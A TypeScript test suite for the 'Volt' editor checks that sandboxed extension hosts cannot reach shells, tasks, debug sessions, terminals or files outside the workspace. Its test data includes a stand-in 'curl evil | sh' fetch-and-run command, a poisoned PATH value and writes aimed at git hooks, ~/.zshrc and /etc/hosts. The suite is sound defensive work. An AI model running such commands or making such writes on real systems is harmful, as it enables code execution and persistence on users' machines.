/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// Volt P2/P6 (spec H.1, B-08): what a sandboxed extension's host may ask the window to do.
// The window runs outside the extension's OS sandbox, so a main-thread API that starts a process,
// types into the user's shell or writes outside the workspace would be an escape.
// T3-ESC-1..9: each such API refuses a sandboxed host with VoltSandboxRefusal; normal hosts are unchanged.

import assert from 'assert';
import { transformErrorForSerialization } from '../../../../base/common/errors.js';
import { Event } from '../../../../base/common/event.js';
import { DisposableStore } from '../../../../base/common/lifecycle.js';
import { URI } from '../../../../base/common/uri.js';
import { mock } from '../../../../base/test/common/mock.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { IBulkEditService, ResourceEdit } from '../../../../editor/browser/services/bulkEditService.js';
import { ICommandService } from '../../../../platform/commands/common/commands.js';
import { FileSystemProviderCapabilities, IFileContent, IFileService } from '../../../../platform/files/common/files.js';
import { ExtensionIdentifier } from '../../../../platform/extensions/common/extensions.js';
import { NullLogService } from '../../../../platform/log/common/log.js';
import { UriIdentityService } from '../../../../platform/uriIdentity/common/uriIdentityService.js';
import { IURLService } from '../../../../platform/url/common/url.js';
import { IWorkspaceContextService, IWorkspaceFolder } from '../../../../platform/workspace/common/workspace.js';
import { ExtensionNotInHostError, IExtHostContext, VoltSandboxedHostError } from '../../../services/extensions/common/extHostCustomers.js';
import { IExtensionService } from '../../../services/extensions/common/extensions.js';
import { IExtensionUrlHandler } from '../../../services/extensions/browser/extensionUrlHandler.js';
import { SerializableObjectWithBuffers } from '../../../services/extensions/common/proxyIdentifier.js';
import { ITrustedDomainService } from '../../../contrib/url/browser/trustedDomainService.js';
import { ConfiguringTask, TaskSourceKind } from '../../../contrib/tasks/common/tasks.js';
import { ITaskProvider, ITaskService } from '../../../contrib/tasks/common/taskService.js';
import { IConfigurationResolverService } from '../../../services/configurationResolver/common/configurationResolver.js';
import { ITerminalInstance, ITerminalService } from '../../../contrib/terminal/browser/terminal.js';
import { IEnvironmentVariableService } from '../../../contrib/terminal/common/environmentVariable.js';
import { MainThreadBulkEdits } from '../../browser/mainThreadBulkEdits.js';
import { MainThreadCommands } from '../../browser/mainThreadCommands.js';
import { MainThreadDebugService } from '../../browser/mainThreadDebugService.js';
import { MainThreadFileSystem } from '../../browser/mainThreadFileSystem.js';
import { MainThreadTask } from '../../browser/mainThreadTask.js';
import { MainThreadTerminalService } from '../../browser/mainThreadTerminalService.js';
import { MainThreadTerminalShellIntegration } from '../../browser/mainThreadTerminalShellIntegration.js';
import { MainThreadUrls } from '../../browser/mainThreadUrls.js';
import { IWorkspaceEditDto } from '../../common/extHost.protocol.js';
import { ITaskDTO } from '../../common/shared/tasks.js';
import { SingleProxyRPCProtocol } from '../common/testRPCProtocol.js';

function context(sandboxed: boolean, proxy: unknown = null, hosts: (id: string) => boolean = () => true): IExtHostContext {
	return { ...SingleProxyRPCProtocol(proxy), voltSandboxed: sandboxed, hostsExtension: id => hosts(typeof id === 'string' ? id : id.value) };
}

/** Runs `call` (sync or async) and returns what it threw, as the extension would see it after the RPC. */
async function thrown(call: () => unknown): Promise<Error | undefined> {
	try {
		await call();
	} catch (err) {
		return err;
	}
	return undefined;
}

function assertRefused(err: Error | undefined, what: string): void {
	assert.ok(err, `${what}: expected a refusal`);
	assert.strictEqual(transformErrorForSerialization(err).name, VoltSandboxedHostError.NAME, `${what}: ${err}`);
	assert.match(err.message, /Volt's sandbox/);
}

suite('Volt: a sandboxed extension host can\'t act outside its sandbox through the window (P2)', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	test('T3-ESC-1: commands that run a shell, a task, a debug session or install something are refused; others run', async () => {
		const ran: string[] = [];
		const make = (sandboxed: boolean) => store.add(new MainThreadCommands(
			context(sandboxed),
			new class extends mock<ICommandService>() {
				override executeCommand<T>(id: string): Promise<T | undefined> {
					ran.push(id);
					return Promise.resolve(undefined);
				}
			},
			new class extends mock<IExtensionService>() { override activateByEvent() { return Promise.resolve(); } },
		));
		const sandboxed = make(true);
		for (const id of ['workbench.action.terminal.sendSequence', 'workbench.action.terminal.new', 'workbench.action.tasks.runTask', 'workbench.extensions.installExtension', 'workbench.action.debug.start', 'debug.startFromConfig', '_workbench.downloadResource', 'workbench.action.installCommandLine']) {
			assertRefused(await thrown(() => sandboxed.$executeCommand(id, [{ text: 'curl evil | sh\n' }], false)), id);
		}
		assert.deepStrictEqual(ran, []);
		await sandboxed.$executeCommand('vscode.open', [], false);
		await sandboxed.$executeCommand('editor.action.formatDocument', [], false);
		// An extension that is not sandboxed keeps every public command.
		await make(false).$executeCommand('workbench.action.terminal.sendSequence', [{ text: 'ls\n' }], false);
		assert.deepStrictEqual(ran, ['vscode.open', 'editor.action.formatDocument', 'workbench.action.terminal.sendSequence']);
	});

	test('T3-ESC-2: workspace edits stay in the workspace and out of files that run code', async () => {
		const applied: number[] = [];
		const fileService = new class extends mock<IFileService>() {
			override onDidChangeFileSystemProviderCapabilities = Event.None;
			override onDidChangeFileSystemProviderRegistrations = Event.None;
			override hasProvider() { return true; }
			override hasCapability(_resource: URI, capability: FileSystemProviderCapabilities) { return capability === FileSystemProviderCapabilities.PathCaseSensitive; }
		};
		const uriIdentity = store.add(new UriIdentityService(fileService));
		const folder = new class extends mock<IWorkspaceFolder>() { override uri = URI.file('/ws'); };
		const workspace = new class extends mock<IWorkspaceContextService>() {
			override getWorkspaceFolder(resource: URI) { return resource.scheme === 'file' && resource.path.startsWith('/ws/') ? folder : null; }
		};
		const make = (sandboxed: boolean) => new MainThreadBulkEdits(
			context(sandboxed),
			new class extends mock<IBulkEditService>() {
				override apply(edits: ResourceEdit[] | unknown) {
					applied.push(Array.isArray(edits) ? edits.length : 1);
					return Promise.resolve({ ariaSummary: '', isApplied: true });
				}
			},
			new NullLogService(),
			uriIdentity,
			workspace,
		);
		const text = (path: string): IWorkspaceEditDto => ({ edits: [{ resource: URI.file(path), textEdit: { range: { startLineNumber: 1, startColumn: 1, endLineNumber: 1, endColumn: 1 }, text: 'x' }, versionId: undefined }] });
		const sandboxed = make(true);
		assert.strictEqual(await sandboxed.$tryApplyWorkspaceEdit(new SerializableObjectWithBuffers(text('/ws/src/a.ts'))), true);
		assert.strictEqual(await sandboxed.$tryApplyWorkspaceEdit(new SerializableObjectWithBuffers({ edits: [{ resource: URI.from({ scheme: 'untitled', path: 'Untitled-1' }), textEdit: { range: { startLineNumber: 1, startColumn: 1, endLineNumber: 1, endColumn: 1 }, text: 'x' }, versionId: undefined }] })), true);
		for (const path of ['/ws/.vscode/tasks.json', '/ws/.git/hooks/pre-commit', '/ws/.github/workflows/ci.yml', '/Users/me/.zshrc', '/etc/hosts']) {
			assertRefused(await thrown(() => sandboxed.$tryApplyWorkspaceEdit(new SerializableObjectWithBuffers(text(path)))), path);
		}
		// A rename or create counts both ends.
		assertRefused(await thrown(() => sandboxed.$tryApplyWorkspaceEdit(new SerializableObjectWithBuffers({ edits: [{ oldResource: URI.file('/ws/hook.sh'), newResource: URI.file('/ws/.git/hooks/post-checkout') }] }))), 'rename into .git/hooks');
		assertRefused(await thrown(() => sandboxed.$tryApplyWorkspaceEdit(new SerializableObjectWithBuffers({ edits: [{ newResource: URI.file('/tmp/elsewhere.txt') }] }))), 'create outside');
		assert.deepStrictEqual(applied, [1, 1]);
		// A host that is not sandboxed edits as before.
		assert.strictEqual(await make(false).$tryApplyWorkspaceEdit(new SerializableObjectWithBuffers(text('/ws/.vscode/tasks.json'))), true);
		assert.deepStrictEqual(applied, [1, 1, 1]);
	});

	test('T3-ESC-3: workspace.fs through the window reaches only the schemes the host serves itself', async () => {
		const read: string[] = [];
		const fileService = new class extends mock<IFileService>() {
			override onDidChangeFileSystemProviderCapabilities = Event.None;
			override onDidChangeFileSystemProviderRegistrations = Event.None;
			override listCapabilities() { return []; }
			override readFile(resource: URI) {
				read.push(resource.toString());
				return Promise.resolve(new class extends mock<IFileContent>() { });
			}
			override writeFile(resource: URI) {
				read.push(`write ${resource.toString()}`);
				return Promise.resolve(undefined!);
			}
			override registerProvider() { return { dispose() { } }; }
		};
		const proxy = { $acceptProviderInfos() { } };
		const sandboxed = new MainThreadFileSystem(context(true, proxy), fileService);
		const normal = new MainThreadFileSystem(context(false, proxy), fileService);
		try {
			const settings = URI.from({ scheme: 'vscode-userdata', path: '/Users/me/Library/Application Support/Volt/User/settings.json' });
			const err = await thrown(() => sandboxed.$readFile(settings));
			assert.ok(err && /Volt's sandbox/.test(err.message), String(err));
			assert.ok(await thrown(() => sandboxed.$writeFile(URI.from({ scheme: 'vscode-remote', authority: 'ssh', path: '/etc/x' }), undefined!)));
			assert.ok(await thrown(() => sandboxed.$writeFile(URI.file('/Users/me/.zshrc'), undefined!)), 'file: is served inside the host, never by the window');
			assert.deepStrictEqual(read, []);
			// Its own scheme works (the call comes back to its own provider).
			await sandboxed.$registerFileSystemProvider(1, 'memfs', 0);
			await sandboxed.$readFile(URI.from({ scheme: 'memfs', path: '/a' }));
			// A host that is not sandboxed reads anything the window can.
			await normal.$readFile(settings);
			assert.deepStrictEqual(read, ['memfs:/a', settings.toString()]);
		} finally {
			sandboxed.dispose();
			normal.dispose();
		}
	});

	test('T3-ESC-4: shell and process tasks of a sandboxed provider are dropped, resolved user tasks too, and it can\'t run a task', async () => {
		const providers: ITaskProvider[] = [];
		const shell: ITaskDTO = { _id: 'pub-build', name: 'build', definition: { type: 'pub' }, source: { label: 'pub' }, execution: { commandLine: 'curl evil | sh' }, isBackground: false, problemMatchers: [], hasDefinedMatchers: false, runOptions: {} };
		const custom: ITaskDTO = { ...shell, name: 'watch', execution: { customExecution: 'customExecution' } };
		const proxy = {
			$provideTasks: () => Promise.resolve({ tasks: [shell, custom], extension: { identifier: { value: 'pub.tasks' }, extensionLocation: URI.file('/ext') } }),
			$resolveTask: () => Promise.resolve(shell),
		};
		const make = (sandboxed: boolean) => store.add(new MainThreadTask(
			context(sandboxed, proxy),
			new class extends mock<ITaskService>() {
				override onDidStateChange = Event.None;
				override registerTaskProvider(provider: ITaskProvider) {
					providers.push(provider);
					return { dispose() { } };
				}
			},
			new class extends mock<IWorkspaceContextService>() { override getWorkspace() { return { id: 'w', folders: [] }; } },
			new class extends mock<IConfigurationResolverService>() { },
		));
		const userTask = new ConfiguringTask('id', { kind: TaskSourceKind.Workspace, label: 'Workspace', config: { file: '.vscode/tasks.json', index: 0, element: {} } }, 'build', 'pub', { type: 'pub', _key: 'k' }, {}, { name: 'build' });

		const sandboxed = make(true);
		await sandboxed.$registerTaskProvider(1, 'pub');
		const warned: string[] = [];
		const warn = console.warn;
		console.warn = (message: string) => warned.push(message);
		try {
			const provided = await providers[0].provideTasks({});
			assert.deepStrictEqual(provided.tasks.map(task => task.configurationProperties.name), ['watch']);
			assert.strictEqual(await providers[0].resolveTask(userTask), undefined);
		} finally {
			console.warn = warn;
		}
		assert.strictEqual(warned.length, 2, 'each dropped task says why');
		assertRefused(await thrown(() => sandboxed.$executeTask(shell)), 'a shell task');
		assertRefused(await thrown(() => sandboxed.$executeTask({ id: 'user-task', workspaceFolder: URI.file('/ws') })), 'the user\'s task');

		const normal = make(false);
		await normal.$registerTaskProvider(2, 'pub');
		assert.deepStrictEqual((await providers[1].provideTasks({})).tasks.map(task => task.configurationProperties.name), ['build', 'watch']);
		assert.strictEqual((await providers[1].resolveTask(userTask))?.configurationProperties.name, 'build');
	});

	function terminals(sandboxed: boolean, hosts: (id: string) => boolean = () => true) {
		const typed: string[] = [];
		const envSet: string[] = [];
		const created = new Map<number, ITerminalInstance>();
		const disposables = store.add(new DisposableStore());
		const instance = (instanceId: number) => new class extends mock<ITerminalInstance>() {
			override instanceId = instanceId;
			override onDisposed = Event.None;
			override sendText(text: string) {
				typed.push(`${instanceId}:${text}`);
				return Promise.resolve();
			}
		};
		const userShell = instance(1);
		const terminalService = new class extends mock<ITerminalService>() {
			override getInstanceFromId(id: number) { return id === 1 ? userShell : created.get(id); }
			override createTerminal() {
				const made = instance(100 + created.size);
				created.set(made.instanceId, made);
				return Promise.resolve(made);
			}
		};
		// The service's constructor wires a dozen terminal services; these tests need only the calls below.
		const service: MainThreadTerminalService = Object.assign(Object.create(MainThreadTerminalService.prototype), {
			_extHostContext: context(sandboxed, null, hosts),
			_terminalService: terminalService,
			_extHostTerminals: new Map(),
			_voltOwnTerminals: new Set<number>(),
			_store: disposables,
			_environmentVariableService: new class extends mock<IEnvironmentVariableService>() {
				override set(id: string) { envSet.push(id); }
				override delete(id: string) { envSet.push(`-${id}`); }
			},
		});
		return { service, typed, envSet };
	}

	test('T3-ESC-5: a sandboxed host gets pseudoterminals only, and types only into terminals it created', async () => {
		const { service, typed } = terminals(true);
		assertRefused(await thrown(() => service.$createTerminal('ext-1', { name: 'sh', shellPath: '/bin/sh', isExtensionCustomPtyTerminal: false })), 'a shell terminal');
		assertRefused(await thrown(() => service.$sendText(1, 'curl evil | sh', true)), 'the user\'s shell');
		await service.$createTerminal('ext-2', { name: 'pty', isExtensionCustomPtyTerminal: true });
		// Before it opens the host names it by its own id, after by the window's number.
		await service.$sendText('ext-2', 'hello', false);
		await service.$sendText(100, 'again', false);
		assert.deepStrictEqual(typed, ['100:hello', '100:again']);

		const normal = terminals(false);
		await normal.service.$createTerminal('ext-3', { name: 'sh', shellPath: '/bin/sh', isExtensionCustomPtyTerminal: false });
		await normal.service.$sendText(1, 'ls', true);
		assert.deepStrictEqual(normal.typed, ['1:ls']);
	});

	test('T3-ESC-6: terminal environment collections: only the host\'s own extension, and none from a sandboxed host', async () => {
		const collection: [string, { value: string; type: number }][] = [['PATH', { value: '/evil', type: 3 }]];
		const sandboxed = terminals(true, id => id === 'pub.mine');
		assertRefused(await thrown(() => sandboxed.service.$setEnvironmentVariableCollection('pub.mine', false, collection as never, [])), 'set the env of the user\'s shells');
		assert.ok((await thrown(() => sandboxed.service.$setEnvironmentVariableCollection('pub.other', false, undefined, []))) instanceof ExtensionNotInHostError);
		// Clearing its own collection is fine.
		sandboxed.service.$setEnvironmentVariableCollection('pub.mine', false, undefined, []);
		assert.deepStrictEqual(sandboxed.envSet, ['-pub.mine']);

		const normal = terminals(false, id => id === 'pub.mine');
		assert.ok((await thrown(() => normal.service.$setEnvironmentVariableCollection('pub.other', false, collection as never, []))) instanceof ExtensionNotInHostError, 'B-08: another extension\'s collection');
		normal.service.$setEnvironmentVariableCollection('pub.mine', false, collection as never, []);
		assert.deepStrictEqual(normal.envSet, ['pub.mine']);
	});

	test('T3-ESC-7: running a command through shell integration is refused', async () => {
		const ran: string[] = [];
		const make = (sandboxed: boolean): MainThreadTerminalShellIntegration => Object.assign(Object.create(MainThreadTerminalShellIntegration.prototype), {
			extHostContext: context(sandboxed),
			_terminalService: new class extends mock<ITerminalService>() {
				override getInstanceFromId() { return new class extends mock<ITerminalInstance>() { override runCommand(line: string) { ran.push(line); return Promise.resolve(); } }; }
			},
		});
		assertRefused(await thrown(() => make(true).$executeCommand(1, 'curl evil | sh')), 'shellIntegration.executeCommand');
		make(false).$executeCommand(1, 'ls');
		assert.deepStrictEqual(ran, ['ls']);
	});

	test('T3-ESC-8: a sandboxed host can\'t start a debug session or rewrite every debug type\'s configuration', async () => {
		const make = (sandboxed: boolean): MainThreadDebugService => Object.assign(Object.create(MainThreadDebugService.prototype), { extHostContext: context(sandboxed) });
		const sandboxed = make(true);
		assertRefused(await thrown(() => sandboxed.$startDebugging(undefined, { type: 'node', name: 'x', request: 'launch', program: '/tmp/evil.js' }, {})), 'startDebugging');
		assertRefused(await thrown(() => sandboxed.$registerDebugConfigurationProvider('*', 1, true, true, true, 1)), 'a provider for every type');
	});

	test('T3-ESC-9: a host registers a URI handler only for an extension it runs (B-08)', async () => {
		const registered: string[] = [];
		const urls = store.add(new MainThreadUrls(
			context(true, null, id => id === 'pub.mine'),
			new class extends mock<ITrustedDomainService>() { },
			new class extends mock<IURLService>() { override registerHandler() { return { dispose() { } }; } },
			new class extends mock<IExtensionUrlHandler>() {
				override registerExtensionHandler(id: { value: string }) { registered.push(id.value); }
				override unregisterExtensionHandler() { }
			},
		));
		assert.ok((await thrown(() => urls.$registerUriHandler(1, new ExtensionIdentifier('github.vscode-pull-request-github'), 'GitHub'))) instanceof ExtensionNotInHostError);
		await urls.$registerUriHandler(2, new ExtensionIdentifier('pub.mine'), 'Mine');
		assert.deepStrictEqual(registered, ['pub.mine']);
	});
});
